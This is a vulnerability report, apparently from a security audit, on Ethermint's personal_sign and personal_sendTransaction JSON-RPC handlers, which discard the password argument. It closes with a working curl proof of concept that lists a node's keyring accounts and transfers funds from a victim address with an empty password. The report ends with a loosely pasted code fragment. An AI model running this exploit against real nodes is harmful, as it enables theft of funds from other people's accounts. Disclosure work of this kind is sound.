### Title
`personal_sign` and `personal_sendTransaction` Silently Discard Password Parameter, Bypassing Key-Usage Authentication — (`rpc/namespaces/ethereum/personal/api.go`)

---

### Summary

Ethermint's `personal_sign` and `personal_sendTransaction` JSON-RPC handlers accept a `password` argument as required by the Ethereum `personal_*` namespace specification, but both handlers silently discard it via the blank-identifier `_ string` convention. Any caller who can reach these endpoints can sign arbitrary data or broadcast fund-transferring transactions from any address held in the node keyring without supplying — or knowing — the correct password.

---

### Finding Description

The `PrivateAccountAPI` in `rpc/namespaces/ethereum/personal/api.go` exposes two security-critical methods:

**`personal_sendTransaction`** (line 131):
```go
func (api *PrivateAccountAPI) SendTransaction(_ context.Context, args evmtypes.TransactionArgs, _ string) (common.Hash, error) {
    api.logger.Debug("personal_sendTransaction", "address", args.To.String())
    return api.backend.SendTransaction(args)
}
```

**`personal_sign`** (line 145):
```go
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)
}
```

In both cases the third positional parameter — the password — is bound to `_` and never forwarded to the backend. The Ethereum `personal_*` specification requires the password to decrypt the encrypted private key before use; omitting this check means the keyring is used unconditionally regardless of what password (including an empty string or garbage) the caller supplies. [1](#0-0) [2](#0-1) 

The `personal` namespace is registered with `Public: false` in `rpc/apis.go`:

```go
{
    Namespace: PersonalNamespace,
    Version:   apiVersion,
    Service:   personal.NewAPI(ctx.Logger, evmBackend),
    Public:    false,
},
``` [3](#0-2) 

In go-ethereum's RPC framework the `Public: false` flag is intended to restrict exposure to IPC only (not HTTP/WebSocket). Whether Ethermint's `server/json_rpc.go` correctly enforces this distinction determines the network-reachability of the attack surface, but the password bypass is present regardless of transport.

---

### Impact Explanation

- **`personal_sendTransaction`**: An attacker who can reach the endpoint submits a `TransactionArgs` struct specifying any `from` address held in the node keyring and any `to`/`value`. Because the password is never checked, the backend signs and broadcasts the transaction immediately, transferring EVM-denom funds from the victim account without authorization.
- **`personal_sign`**: An attacker can obtain a valid ECDSA signature over arbitrary data (including EIP-712 typed-data payloads, permit messages, or IBC authorization messages) for any keyring address without knowing the password. The resulting signature can be replayed in downstream contracts or cross-chain contexts to authorize fund movements.

Both paths constitute unauthorized fund transfer or forged execution from accounts the attacker does not control, matching the **High** impact category: *signer verification bypass enabling forged execution or unauthorized account mutation*.

---

### Likelihood Explanation

- If `Public: false` is not enforced over HTTP (which cannot be ruled out without reading `server/json_rpc.go`), the endpoint is reachable by any network peer, making exploitation trivial.
- Even if restricted to IPC, any co-located process (e.g., a compromised sidecar, a malicious dApp running locally, or a CI/CD pipeline with node access) can exploit this with a single JSON-RPC call and an empty password string.
- The `ImportRawKey` backend function at `rpc/backend/node_info.go` line 199 shows the keyring is populated with real private keys, confirming real funds are at risk. [4](#0-3) 

---

### Recommendation

1. Forward the `password` parameter to the backend signing path and use it to decrypt the armored private key before signing, consistent with the Ethereum `personal_*` specification.
2. Verify that `Public: false` is correctly enforced in `server/json_rpc.go` so that `personal_*` methods are never served over HTTP or WebSocket transports.
3. Consider deprecating `personal_sendTransaction` entirely (as go-ethereum itself has done) in favor of requiring callers to sign offline and submit via `eth_sendRawTransaction`.

---

### Proof of Concept

```bash
# 1. Discover a keyring address managed by the node
curl -s -X POST http://<node>:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# Returns: ["0xVICTIM_ADDRESS"]

# 2. Send funds from victim address to attacker — password field is empty string
curl -s -X POST http://<node>:8545 \
  -H 'Content-Type: application/json' \
  -d '{
    "jsonrpc":"2.0",
    "method":"personal_sendTransaction",
    "params":[{
      "from":"0xVICTIM_ADDRESS",
      "to":"0xATTACKER_ADDRESS",
      "value":"0xDE0B6B3A7640000"
    }, ""],
    "id":2
  }'
# Returns a tx hash; funds transferred without password verification
```

The password `""` is accepted identically to the correct password because the parameter is discarded at line 131 of `rpc/namespaces/ethereum/personal/api.go` before any key-decryption step is reached. [1](#0-0)

func (b *Backend) ImportRawKey(privkey, password string) (common.Address, error) {
	priv, err := crypto.HexToECDSA(privkey)
	if err != nil {
		return common.Address{}, err
	}

	privKey := &ethsecp256k1.PrivKey{Key: crypto.FromECDSA(priv)}

	addr := sdk.AccAddress(privKey.PubKey().Address().Bytes())
	ethereumAddr := common.BytesToAddress(addr)

	// return if the key has already been imported
	if _, err := b.clientCtx.Keyring.KeyByAddress(addr); err == nil {
		return ethereumAddr, nil
	}

	// ignore error as we only care about the length of the list
	list, _ := b.clientCtx.Keyring.List()
	privKeyName := fmt.Sprintf("personal_%d", len(list))

	armor := sdkcrypto.EncryptArmorPrivKey(privKey, password, ethsecp256k1.KeyType)

	if err := b.clientCtx.Keyring.ImportPrivKey(privKeyName, armor, password); err != nil {
		return common.Address{}, err
	}

	b.logger.Info("key successfully imported", "name", privKeyName, "address", ethereumAddr.String())

	return ethereumAddr, nil
```
